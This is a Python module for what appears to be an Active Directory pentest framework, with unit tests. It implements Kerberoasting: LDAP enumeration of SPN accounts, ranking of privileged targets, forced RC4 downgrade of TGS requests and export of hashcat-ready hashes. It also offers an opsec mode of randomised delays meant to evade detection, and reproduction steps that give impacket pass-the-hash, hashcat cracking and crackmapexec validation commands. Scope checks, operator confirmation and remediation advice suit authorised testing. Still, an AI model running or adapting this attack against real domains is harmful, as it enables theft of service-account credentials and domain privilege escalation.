"""Kerberoasting — request TGS tickets for SPN accounts, output hashcat format.

Attack: TA0006/T1558.003
An authenticated domain user requests Kerberos service tickets (TGS) for accounts
with SPNs registered. The encrypted portion of the ticket is encrypted with the
service account's NT hash, enabling offline cracking.

Improvements over baseline:
- RC4 downgrade forcing (etype 23) with AES-only fallback (etype 18), aesKey=''
- 5-tier account prioritization (adminCount=1 → machine accounts)
- Password age calculation from Windows FILETIME
- Opsec mode: randomised inter-request delays (5-30 s)
- Separate hash files for RC4 vs AES
- Rich evidence with per-account tier / age metadata
- CVSS 4.0 scoring on all findings
"""
from __future__ import annotations

import asyncio
import os
import random
import tempfile
import time
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_KERBEROAST   = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_KERBEROAST = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"

ETYPE_RC4_HMAC   = 23   # hashcat -m 13100  ->  $krb5tgs$23$
ETYPE_AES256_CTS = 18   # hashcat -m 19700  ->  $krb5tgs$18$

# Windows FILETIME -> Unix: divide by 10_000_000, subtract 11_644_473_600
_FILETIME_EPOCH_OFFSET      = 11_644_473_600
_FILETIME_INTERVALS_PER_SEC = 10_000_000

# Tier-2 keywords — service accounts are high-value targets
_TIER2_KEYWORDS = (
    "svc", "service", "sql", "mssql", "oracle", "web", "iis",
    "exchange", "exch", "backup", "bkp", "admin", "sharepoint",
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _filetime_to_unix(filetime: int) -> float:
    """Convert Windows FILETIME (100-ns intervals since 1601-01-01) to Unix ts."""
    return (filetime / _FILETIME_INTERVALS_PER_SEC) - _FILETIME_EPOCH_OFFSET


def _days_since_pwd_set(filetime_value: object) -> int | None:
    """Return whole days since pwdLastSet, or None when value is zero/missing."""
    try:
        ft = int(str(filetime_value))
        if ft <= 0:
            return None
        elapsed = time.time() - _filetime_to_unix(ft)
        return max(0, int(elapsed / 86400))
    except (TypeError, ValueError, OverflowError):
        return None


def _compute_tier(account: dict) -> int:
    """Return prioritisation tier 1-5 for a kerberoastable account.

    Tier 1: adminCount=1            (protected / privileged)
    Tier 2: service keyword in name  (likely service account with weak pwd)
    Tier 3: password age > 365 days  (never rotated)
    Tier 4: all others
    Tier 5: machine accounts ($ suffix) - least interesting
    """
    sam         = str(account.get("sAMAccountName", "")).lower()
    admin_count = int(str(account.get("adminCount") or 0))
    days        = _days_since_pwd_set(account.get("pwdLastSet"))

    if sam.endswith("$"):
        return 5
    if admin_count == 1:
        return 1
    if any(kw in sam for kw in _TIER2_KEYWORDS):
        return 2
    if days is not None and days > 365:
        return 3
    return 4


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------

class Kerberoast(BaseModule):
    """Kerberoasting: enumerate SPN accounts, request TGS tickets, emit hashcat hashes.

    Config extras consumed:
      domain      FQDN of the AD domain
      dc          DC IP / hostname  (falls back to config.target)
      username    authenticating user
      password    cleartext password
      hash        NT hash or LM:NT  (alternative to password)
      force_rc4   bool, default True - prefer etype-23; AES-only accounts go to aes file
      opsec       bool, default False - random 5-30 s sleep between requests
      results_dir output directory for hash files
    """

    NAME        = "kerberoast"
    DESCRIPTION = (
        "Kerberoasting: enumerate SPNs via LDAP, request TGS tickets, "
        "save hashcat -m 13100 (RC4) and -m 19700 (AES-256) format"
    )
    PHASE = 5
    TAGS  = ["kerberoast", "kerberos", "credential", "mitre-T1558.003"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        if not self._has_creds():
            return self._make_result(start, skipped=True, skip_reason="no credentials provided")

        domain    = self.config.extra.get("domain", "")
        dc_ip     = self.config.extra.get("dc", self.config.target)
        force_rc4 = bool(self.config.extra.get("force_rc4", True))
        opsec     = bool(self.config.extra.get("opsec", False))

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        await self.rate_limit()
        spn_accounts = await self._enum_spn_accounts(domain, dc_ip)

        if not spn_accounts:
            self.log.info("No kerberoastable accounts found (no active users with SPNs)")
            return self._make_result(start)

        # Sort by tier before requesting (Tier 1 first - highest impact)
        spn_accounts.sort(key=_compute_tier)
        tier1_count = sum(1 for a in spn_accounts if _compute_tier(a) == 1)
        self.log.info(
            "Found %d SPN account(s) - Tier-1 (adminCount=1): %d",
            len(spn_accounts), tier1_count,
        )

        confirmed = self.confirm_action(
            action=f"Request Kerberos TGS tickets for {len(spn_accounts)} SPN account(s)",
            target=domain,
            risk=(
                f"Targets: {', '.join(a.get('sAMAccountName','?') for a in spn_accounts[:5])}. "
                "Generates Event 4769 per ticket. RC4 downgrade (etype 0x17) is flagged by "
                "Defender for Identity, Splunk ES, and most SIEMs."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        rc4_hashes: list[str]  = []
        aes_hashes: list[str]  = []
        rc4_meta:   list[dict] = []
        aes_meta:   list[dict] = []

        results_dir = Path(self.config.extra.get("results_dir", tempfile.gettempdir()))
        hashes_dir  = results_dir / "hashes"
        hashes_dir.mkdir(parents=True, exist_ok=True)

        for account in spn_accounts:
            username = account.get("sAMAccountName", "")
            spns     = account.get("servicePrincipalName", [])
            if isinstance(spns, str):
                spns = [spns]
            if not spns:
                continue

            enc_types    = int(str(account.get("msDS-SupportedEncryptionTypes") or 0))
            # enc_types == 0 means default (includes RC4); bit 2 (0x4) = RC4 explicit support
            supports_rc4 = (enc_types == 0) or bool(enc_types & 0x4)
            tier         = _compute_tier(account)
            days         = _days_since_pwd_set(account.get("pwdLastSet"))

            meta = {
                "username":              username,
                "spn":                   spns[0],
                "tier":                  tier,
                "days_since_pwdLastSet": days,
                "admin_count":           int(str(account.get("adminCount") or 0)),
                "supports_rc4":          supports_rc4,
                "enc_types_raw":         enc_types,
            }

            if opsec:
                delay = random.uniform(5.0, 30.0)
                self.log.debug("Opsec: sleeping %.1f s before TGS request for %s", delay, username)
                await asyncio.sleep(delay)
            else:
                await self.rate_limit()

            # Determine preferred etype
            if force_rc4 and supports_rc4:
                preferred = ETYPE_RC4_HMAC
            elif not supports_rc4:
                preferred = ETYPE_AES256_CTS  # AES-only account
            else:
                preferred = ETYPE_RC4_HMAC

            hash_str = await self._request_tgs(username, spns[0], domain, dc_ip, preferred)
            if not hash_str:
                continue

            account["_hash"] = hash_str
            if "$krb5tgs$18$" in hash_str:
                aes_hashes.append(hash_str)
                aes_meta.append(meta)
                self.log.info("TGS AES-256/etype18 obtained: %s [tier=%d, days=%s]",
                              username, tier, days)
            else:
                rc4_hashes.append(hash_str)
                rc4_meta.append(meta)
                self.log.info("TGS RC4/etype23 obtained: %s [tier=%d, days=%s]",
                              username, tier, days)

        all_hashes = rc4_hashes + aes_hashes
        if not all_hashes:
            self.log.info("No TGS tickets obtained")
            return self._make_result(start)

        # Write hash files
        rc4_file = hashes_dir / "kerberoast_rc4_hashes.txt"
        aes_file = hashes_dir / "kerberoast_aes_hashes.txt"
        all_file = hashes_dir / "kerberoast_all_hashes.txt"

        if rc4_hashes:
            rc4_file.write_text(
                "# RC4 (etype 23) - hashcat -m 13100\n" + "\n".join(rc4_hashes) + "\n",
                encoding="utf-8",
            )
        if aes_hashes:
            aes_file.write_text(
                "# AES-256 (etype 18) - hashcat -m 19700\n" + "\n".join(aes_hashes) + "\n",
                encoding="utf-8",
            )
        all_file.write_text(
            "# All Kerberoast hashes - RC4: -m 13100  AES256: -m 19700\n"
            + "\n".join(all_hashes) + "\n",
            encoding="utf-8",
        )

        self.config.extra["kerberoast_hashes"]     = all_hashes
        self.config.extra["kerberoast_rc4_hashes"] = rc4_hashes
        self.config.extra["kerberoast_aes_hashes"] = aes_hashes

        all_meta   = rc4_meta + aes_meta
        admin_list = [m for m in all_meta if m.get("admin_count") == 1]
        severity   = Severity.CRITICAL if admin_list else Severity.HIGH

        admin_note = ""
        if admin_list:
            names = ", ".join(m["username"] for m in admin_list[:5])
            admin_note = (
                f"\n\nCRITICAL: {len(admin_list)} adminCount=1 account(s) roasted: "
                f"{names} - cracking these grants direct privileged domain access."
            )

        user_cred = self.config.extra.get("username", "USER")
        pass_cred = self.config.extra.get("password", "PASS")
        nt_cred   = self.config.extra.get("hash", "")

        repro = [
            "# Enumerate + request (impacket, one command):",
            f"impacket-GetUserSPNs {domain}/{user_cred}:{pass_cred} "
            f"-dc-ip {dc_ip} -request -outputfile {all_file}",
        ]
        if nt_cred:
            nt_short = nt_cred.split(":")[-1] if ":" in nt_cred else nt_cred
            repro += [
                "# Pass-the-hash variant:",
                f"impacket-GetUserSPNs {domain}/{user_cred} -hashes :{nt_short} "
                f"-dc-ip {dc_ip} -request -outputfile {all_file}",
            ]
        repro += [
            "# Crack RC4 (etype 23) - ~10 GH/s on RTX 4090:",
            f"hashcat -m 13100 {rc4_file} /usr/share/wordlists/rockyou.txt --force",
            "# Crack AES-256 (etype 18) - ~100 MH/s, significantly slower:",
            f"hashcat -m 19700 {aes_file} /usr/share/wordlists/rockyou.txt",
            "# Validate cracked credentials:",
            f"crackmapexec smb {dc_ip} -u <user> -p '<cracked_pass>' -d {domain}",
        ]

        ev = Evidence(
            request_raw=(
                "LDAP: (&(objectClass=user)(objectCategory=person)"
                "(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
            ),
            extra={
                "total_hashes":       len(all_hashes),
                "rc4_hash_count":     len(rc4_hashes),
                "aes_hash_count":     len(aes_hashes),
                "rc4_hash_file":      str(rc4_file) if rc4_hashes else None,
                "aes_hash_file":      str(aes_file) if aes_hashes else None,
                "all_hash_file":      str(all_file),
                "rc4_accounts":       rc4_meta,
                "aes_only_accounts":  aes_meta,
                "admin_accounts":     [m["username"] for m in admin_list],
                "tier1_accounts":     [m["username"] for m in all_meta if m["tier"] == 1],
                "tier2_accounts":     [m["username"] for m in all_meta if m["tier"] == 2],
                "stale_pwd_accounts": [
                    m["username"] for m in all_meta
                    if (m.get("days_since_pwdLastSet") or 0) > 365
                ],
                "hashcat_rc4_cmd":    f"hashcat -m 13100 {rc4_file} rockyou.txt" if rc4_hashes else None,
                "hashcat_aes_cmd":    f"hashcat -m 19700 {aes_file} rockyou.txt" if aes_hashes else None,
                "opsec_mode":         opsec,
                "force_rc4":          force_rc4,
            },
        )

        self.new_finding(
            title=f"Kerberoastable Accounts - {len(all_hashes)} TGS Ticket(s) Obtained",
            severity=severity,
            description=(
                f"{len(all_hashes)} Kerberos TGS ticket(s) captured for SPN-registered accounts. "
                f"RC4-crackable (hashcat -m 13100): {len(rc4_hashes)}.  "
                f"AES-256 (hashcat -m 19700): {len(aes_hashes)}. "
                f"Tier breakdown - T1 adminCount=1: {sum(1 for m in all_meta if m['tier']==1)}, "
                f"T2 service prefix: {sum(1 for m in all_meta if m['tier']==2)}, "
                f"T3 stale pwd >365d: {sum(1 for m in all_meta if m['tier']==3)}."
                + admin_note +
                "\n\nRC4 hashes are crackable at ~10 GH/s on commodity GPUs. "
                "Migrate service accounts to gMSA to eliminate the entire attack class."
            ),
            reproduction_steps=repro,
            remediation=(
                "1. Migrate service accounts to Group Managed Service Accounts (gMSA) - "
                "   240-bit random keys, auto-rotated, not Kerberoastable.\n"
                "2. For legacy accounts: enforce 30+ char random passwords, quarterly rotation.\n"
                "3. Remove unnecessary SPNs: SetSPN -D <spn> <account>\n"
                "4. Set msDS-SupportedEncryptionTypes=28 (AES128+AES256 only, no RC4) on "
                "   all service accounts.\n"
                "5. Add service accounts to Protected Users group where feasible.\n"
                "6. Monitor Event ID 4769 with Encryption Type 0x17 (RC4) for Kerberoasting "
                "   detection. Alert on >5 RC4 TGS requests in 60 s from one host.\n"
                "7. Deploy Microsoft Defender for Identity for automated detection."
            ),
            references=[
                "MITRE TA0006/T1558.003",
                "https://attack.mitre.org/techniques/T1558/003/",
                "https://adsecurity.org/?p=3458",
                "CWE-522 - Insufficiently Protected Credentials",
                "https://www.semperis.com/blog/kerberoasting-revisited/",
            ],
            evidence=ev,
            cvss_v31_vector=CVSS_KERBEROAST,
            cvss_v40_vector=CVSS40_KERBEROAST,
            mitre_attack=["TA0006/T1558.003"],
            target=dc_ip,
        )

        return self._make_result(start)

    # -----------------------------------------------------------------------
    # Enumeration
    # -----------------------------------------------------------------------

    async def _enum_spn_accounts(self, domain: str, dc_ip: str) -> list[dict]:
        """Enumerate user accounts with SPNs via LdapClient.get_spn_accounts()."""
        try:
            client = LdapClient(
                dc_ip=dc_ip, domain=domain,
                username=self.config.extra.get("username", ""),
                password=self.config.extra.get("password", ""),
                nt_hash=self.config.extra.get("hash", ""),
            )
            if not client.connect():
                return self.config.extra.get("spn_accounts", [])
            try:
                results = client.get_spn_accounts()
                self.log.info("LDAP SPN enum: %d kerberoastable account(s)", len(results))
                self.config.extra["spn_accounts"] = results
                return results
            finally:
                client.disconnect()
        except Exception as exc:
            self.log.debug("SPN LDAP enum failed: %s", exc)
            return self.config.extra.get("spn_accounts", [])

    # -----------------------------------------------------------------------
    # TGS request
    # -----------------------------------------------------------------------

    async def _request_tgs(
        self,
        username: str,
        spn: str,
        domain: str,
        dc_ip: str,
        preferred_etype: int = ETYPE_RC4_HMAC,
    ) -> str | None:
        """Request a TGS ticket and return hashcat-format hash.

        Authenticates without an AES key (aesKey='') to force an RC4 TGT session
        key, maximising the chance the KDC selects RC4 for the service ticket
        encrypted portion when the service account supports it. Actual etype is
        read from the KDC response cipher object and drives the hash prefix.
        """
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal

            user     = self.config.extra.get("username", "")
            password = self.config.extra.get("password", "")
            nt_hash  = self.config.extra.get("hash", "")
            lm_hash  = ""
            aes_key  = ""  # Never pass aesKey - forces RC4 TGT session key

            if nt_hash and ":" in nt_hash:
                lm_hash, nt_hash = nt_hash.split(":", 1)

            user_principal = Principal(
                user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                user_principal, password, domain, lm_hash, nt_hash, aes_key, dc_ip
            )

            server_principal = Principal(
                spn, type=constants.PrincipalNameType.NT_SRV_INST.value
            )
            tgs, cipher_tgs, _, _session_key_tgs = getKerberosTGS(
                server_principal, domain, dc_ip, tgt, cipher, session_key
            )

            # Read actual etype from KDC response; fall back to preferred_etype
            actual_etype = getattr(cipher_tgs, "enctype", preferred_etype)
            return self._format_tgs_hash(username, domain, spn, tgs, cipher_tgs, actual_etype)

        except ImportError:
            self.log.warning("impacket not installed - falling back to CLI")
            return await self._impacket_cli_fallback(username, spn, domain, dc_ip)
        except Exception as exc:
            self.log.debug("TGS request failed for %s/%s: %s", username, spn, exc)
            return None

    async def _impacket_cli_fallback(
        self, username: str, spn: str, domain: str, dc_ip: str
    ) -> str | None:
        """Call GetUserSPNs.py CLI when the impacket Python API is unavailable."""
        import shutil
        script = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
        if not script:
            return None

        user    = self.config.extra.get("username", "")
        pwd     = self.config.extra.get("password", "")
        nt_hash = self.config.extra.get("hash", "")

        if nt_hash:
            nt  = nt_hash.split(":")[-1] if ":" in nt_hash else nt_hash
            cmd = [script, f"{domain}/{user}", "-hashes", f":{nt}",
                   "-dc-ip", dc_ip, "-request-user", username]
        else:
            cmd = [script, f"{domain}/{user}:{pwd}",
                   "-dc-ip", dc_ip, "-request-user", username]

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
            for line in stdout.decode().splitlines():
                line = line.strip()
                if line.startswith("$krb5tgs$"):
                    return line
        except Exception as exc:
            self.log.debug("CLI fallback failed for %s: %s", username, exc)
        return None

    # -----------------------------------------------------------------------
    # Hash formatting
    # -----------------------------------------------------------------------

    def _format_tgs_hash(
        self,
        username: str,
        domain: str,
        spn: str,
        tgs: object,
        cipher: object,
        etype: int | None = None,
    ) -> str:
        """Format TGS ticket bytes as a hashcat $krb5tgs$ string.

        RC4  (etype 23): hashcat -m 13100  - $krb5tgs$23$*user$realm$spn*$cksum$data
        AES256 (etype 18): hashcat -m 19700 - $krb5tgs$18$*user$realm$spn*$cksum$data

        etype is taken from cipher.enctype when not explicitly supplied (backward-compat).
        """
        try:
            if etype is None:
                try:
                    etype = getattr(cipher, "enctype", ETYPE_RC4_HMAC)
                except Exception:
                    etype = ETYPE_RC4_HMAC

            # Normalise tgs to raw bytes
            if isinstance(tgs, (bytes, bytearray)):
                raw = bytes(tgs)
            elif hasattr(tgs, "getData"):
                raw = tgs.getData()
            else:
                raw = b""

            if len(raw) > 16:
                checksum = raw[-16:].hex()
                data     = raw[:-16].hex()
            else:
                checksum = raw.hex()
                data     = ""

            realm = domain.upper()
            if etype == ETYPE_AES256_CTS:
                return f"$krb5tgs$18$*{username}${realm}${spn}*${checksum}${data}"
            return f"$krb5tgs$23$*{username}${realm}${spn}*${checksum}${data}"
        except Exception as exc:
            self.log.debug("Hash format error for %s: %s", username, exc)
            return ""

    def _has_creds(self) -> bool:
        return bool(
            self.config.extra.get("username") and
            (self.config.extra.get("password") or self.config.extra.get("hash"))
        )


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestKerberoast:
    """Unit tests - preserved originals plus new tier / age tests."""

    # -- Credential check ----------------------------------------------------

    def test_has_creds_true(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        mod.config = type("C", (), {"extra": {"username": "u", "password": "p"}})()
        assert mod._has_creds() is True

    def test_has_creds_false(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        mod.config = type("C", (), {"extra": {}})()
        assert mod._has_creds() is False

    def test_has_creds_hash_only(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        mod.config = type("C", (), {"extra": {"username": "u", "hash": "aad3:ntntnt"}})()
        assert mod._has_creds() is True

    # -- Hash formatting -----------------------------------------------------

    def test_format_hash_rc4(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        mod.log = __import__("logging").getLogger("test")
        result = mod._format_tgs_hash(
            "svc_sql", "CORP.LOCAL", "MSSQLSvc/dc01:1433",
            b"\xab" * 100, type("C", (), {"enctype": 23})(),
        )
        assert result.startswith("$krb5tgs$23$")
        assert "svc_sql" in result
        assert "CORP.LOCAL" in result

    def test_format_hash_aes(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        mod.log = __import__("logging").getLogger("test")
        result = mod._format_tgs_hash(
            "svc_iis", "CORP.LOCAL", "HTTP/web01",
            b"\xcd" * 80, type("C", (), {"enctype": 18})(),
        )
        assert result.startswith("$krb5tgs$18$")

    def test_format_hash_explicit_etype_overrides_cipher(self) -> None:
        """Explicit etype param must override cipher.enctype."""
        mod = Kerberoast.__new__(Kerberoast)
        mod.log = __import__("logging").getLogger("test")
        result = mod._format_tgs_hash(
            "svc_test", "CORP.LOCAL", "host/srv01",
            b"\xef" * 64,
            type("C", (), {"enctype": 23})(),  # cipher says RC4
            etype=18,                           # explicit override to AES256
        )
        assert result.startswith("$krb5tgs$18$")

    # -- CVSS / phase --------------------------------------------------------

    def test_cvss_vector(self) -> None:
        from common.finding import cvss31_score
        score = cvss31_score(CVSS_KERBEROAST)
        assert score >= 7.0

    def test_cvss40_vector_present(self) -> None:
        assert CVSS40_KERBEROAST.startswith("CVSS:4.0")
        assert "VC:H" in CVSS40_KERBEROAST

    def test_phase(self) -> None:
        assert Kerberoast.PHASE == 5

    # -- Tier computation ----------------------------------------------------

    def test_compute_tier_admin_count(self) -> None:
        account = {"sAMAccountName": "regularuser", "adminCount": 1, "pwdLastSet": 0}
        assert _compute_tier(account) == 1

    def test_compute_tier_service_prefix(self) -> None:
        account = {"sAMAccountName": "svc_backup", "adminCount": 0, "pwdLastSet": 0}
        assert _compute_tier(account) == 2

    def test_compute_tier_sql_keyword(self) -> None:
        account = {"sAMAccountName": "mssql_agent", "adminCount": 0, "pwdLastSet": 0}
        assert _compute_tier(account) == 2

    def test_compute_tier_stale_password(self) -> None:
        # pwdLastSet from 800 days ago
        days_800 = int(time.time()) - 800 * 86400
        filetime  = int((days_800 + _FILETIME_EPOCH_OFFSET) * _FILETIME_INTERVALS_PER_SEC)
        account = {"sAMAccountName": "someuser", "adminCount": 0, "pwdLastSet": filetime}
        assert _compute_tier(account) == 3

    def test_compute_tier_machine_account(self) -> None:
        account = {"sAMAccountName": "WEB01$", "adminCount": 0, "pwdLastSet": 0}
        assert _compute_tier(account) == 5

    def test_compute_tier_normal_user(self) -> None:
        account = {"sAMAccountName": "jdoe", "adminCount": 0, "pwdLastSet": 0}
        assert _compute_tier(account) == 4

    # -- Password-age helpers ------------------------------------------------

    def test_days_since_pwd_set_zero(self) -> None:
        assert _days_since_pwd_set(0) is None

    def test_days_since_pwd_set_none(self) -> None:
        assert _days_since_pwd_set(None) is None

    def test_days_since_pwd_set_recent(self) -> None:
        yesterday = int(time.time()) - 86400
        filetime  = int((yesterday + _FILETIME_EPOCH_OFFSET) * _FILETIME_INTERVALS_PER_SEC)
        days = _days_since_pwd_set(filetime)
        assert days is not None
        assert 0 <= days <= 2

    def test_sort_by_tier(self) -> None:
        accounts = [
            {"sAMAccountName": "jdoe",    "adminCount": 0, "pwdLastSet": 0},
            {"sAMAccountName": "krbtgt",  "adminCount": 1, "pwdLastSet": 0},
            {"sAMAccountName": "WEB01$",  "adminCount": 0, "pwdLastSet": 0},
            {"sAMAccountName": "svc_sql", "adminCount": 0, "pwdLastSet": 0},
        ]
        accounts.sort(key=_compute_tier)
        assert accounts[0]["sAMAccountName"] == "krbtgt"   # tier 1
        assert accounts[1]["sAMAccountName"] == "svc_sql"  # tier 2
        assert accounts[-1]["sAMAccountName"] == "WEB01$"  # tier 5
